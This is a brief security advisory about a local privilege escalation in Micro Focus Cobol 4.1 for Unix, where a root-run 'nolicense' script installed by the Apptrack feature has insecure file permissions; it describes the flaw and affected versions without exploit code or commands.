Micro Focus Cobol is a development suite for unix platforms offered by Merant. It is typically licensed on a per-user basis.

If Micro Focus Cobol is installed with the 'Apptrack' feature enabled, local users may be able to elevate privileges. A shell script called 'nolicense' that is executed as root is installed with insecure file permissions.

As a result, attackers may be able to execute arbitrary commands as root if the script is modified.

This is known to affect version 4.1. Though unverified, previous versions of Micro Focus Cobol may also be vulnerable.
